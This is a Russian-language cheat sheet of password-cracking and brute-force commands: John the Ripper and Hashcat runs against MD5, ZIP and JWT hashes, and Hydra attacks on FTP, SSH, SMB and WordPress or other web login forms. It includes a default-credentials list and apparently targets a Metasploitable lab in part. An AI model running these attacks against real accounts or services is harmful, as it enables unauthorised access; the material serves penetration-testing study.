## John the ripper

Имея hash пароля пытается подобрать верный пароль.
Пример:
```bash
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt -format={hash format, напримире bcrypt} resultFile.txt
```
### MD5

Пример:
```bash 
john md5.hash --wordlist=/usr/share/wordlist/rockyou.txt -format=Raw-MD5 resultFile.txt
```
или стандартный взлом hash-а:
```bash
john hash.txt --show
```
### Zip archive
```bash
zip2john archive.zip > arch.hash
john arch.hash -w rockyou.txt
```
### JWT
```bash
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256
```

---

# Hashcat

## Введение 

**Hashcat** — легендарный взломщик паролей, предназначенный для взлома даже самых сложных паролей. Популярный инструмент позволяет взломать пароль разными способами. В этой статье я покажу, как пользоваться **Hashcat**.

Еще по теме: [Как с помощью документа перехватить хеш NTLMv2-SSP](https://spy-soft.net/intercept-ntlmv2-ssp-hash-and-bruteforce-password/)

Представления паролей в первую очередь связаны с хэш-ключами, такими как **MD5, SHA, WHIRLPOOL, RipeMD, NTMLv1, NTMLv2** и т. д.

**Hashcat** переводит читаемые данные в искаженное состояние (это случайная строка фиксированного размера). Хэши не позволяют кому-либо расшифровать данные с помощью определенного ключа, как это позволяют стандартные протоколы шифрования. **Hashcat** использует предварительно вычисленные словари, радужные таблицы и даже методы брутфорса, чтобы найти эффективный и действенный способ взлома паролей.

Кстати, про использование Hashcat в Windows, мы рассказывали в [этой статье.](https://spy-soft.net/hashcat-windows/)

## Использование

Некоторые из наиболее важных параметров **hashcat** — это `-m` (тип хеша) и `-a` (режим атаки). В общем, нам нужно использовать оба варианта в большинстве попыток взлома паролей при использовании **Hashcat**.

Взлом хэшей:
```bash
hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt rockyou.txt
```
Где:
- `-m 0` - тип хеша, который мы взламываем (MD5).
- `-a 0` - атаку по словарю.
- `-o cracked.txt` - выходной файл.
- `target_hashes.txt` - хэши, которые нужно взломать.
- `rockyou.txt` - список паролей.


---

## Hydra

### Введение 

[Hydra](https://github.com/vanhauser-thc/thc-hydra) - это распараллеленый брутфорс паролей к различным сервисам (**FTP, POP3, IMAP, Telnet, HTTP Auth, NNTP, VNC, ICQ, PCNFS, CISCO** и др.) для **UNIX** платформ. С помощью этой утилиты вы можете атаковать несколько сервисов одновременно.

В основе программы лежит модульная структура. С помощью Гидры пароль можно подобрать к более чем 30 протоколам, включая **telnet, ftp, http, https, smb, несколькими СУБД**, и т.д. Кстати, Hydra [брутит и SSH](https://spy-soft.net/bruteforce-ssh-metasploit/), но для этого требуется наличие библиотеки **libssh**. 

### FTP сервер, SSH, SMB

Буду использовать специально уязвимую машину [Metasploitable](https://spy-soft.net/install-metasploitable-virtual-box/). 

Вы можете использовать логины и пароли по умолчанию, содержащиеся в списке` ftp-betterdefaultpasslist.txt`, который входит в набор **SecLists**. Ниже приводится копия всего словаря для брута:
```
anonymous:anonymous
root:rootpasswd
root:12hrs37
ftp:b1uRR3
admin:admin
localadmin:localadmin
admin:1234
```
Не все словари, входящие в набор [SecLists](https://www.kali.org/tools/seclists/ "SecLists"), такие же короткие. Фактически приведенный выше список паролей — один из самых коротких в коллекции **SecLists**, что делает его отличным вариантом для демонстрации брута паролей с помощью **Hydra**. Чем длиннее список, тем больше времени придется брутить.

Запустите Hydra, используя следующую команду, где `192.168.1.101` — это **IP**-адрес целевого сервера (в моем случае —  **Metasploitable**):
```
hydra -C ./ftp-betterdefaultpasslist.txt 192.168.1.101 ftp
```
Пример брутфорса пароля **SSH** на порту **2222**:
```bash
hydra -l {username} -P {brutList.txt} ssh:10.10.1.2:2222
```
Брутфорс авторизации по **smb**:
```bash
hydra -L users.txt -P pass.txt {IP} smb -V
```
### Брут внутри формы авторизации

Пример брутфорса пароля внутри формы авторизации на `wordpress/wp-login.php`:
```bash 
hydra -L {username} -p {brutList.txt} {url например 10.10.1.2} http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
```
```bash
hydra -l {username} -P {brutList.txt} {url например 10.10.1.2} http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for username" -t 30
```
Брутворс формы авторизации на конкретном сайте:
``` bash
hydra -t 5 -V -L UserList -P PasswordList -f [домен] http-post-form -m "/webapps/login/:user_id=§^USER^§&password=§^PASS^§&login=§Login§&action=§login§&new_loc=§§:F=The username or password you typed is incorrect"
```


---
# Взлом Hash-а - hash-identifier
```bash
hash-identifier
HASH: {hash}
```

---

# Другие

Вот еще несколько популярных инструментов для подбора паролей:

[Metasploit](https://github.com/rapid7/metasploit-framework) - это многофункциональный инструмент для тестирования на проникновение, который имеет модули для подбора паролей и поддерживает различные протоколы и сервисы.

[LEGBA](https://github.com/evilsocket/legba) - многопротокольный брутфорсер учетных данных на языке **Rust**.

[Medusa](https://github.com/jmk-foofus/medusa) - еще один инструмент для атаки на пароли, который также поддерживает различные протоколы.

[Ncrack](https://github.com/nmap/ncrack) - инструмент для взлома паролей **SSH**, **RDP**, **FTP** и так далее. Имеет возможность многопоточного сканирования.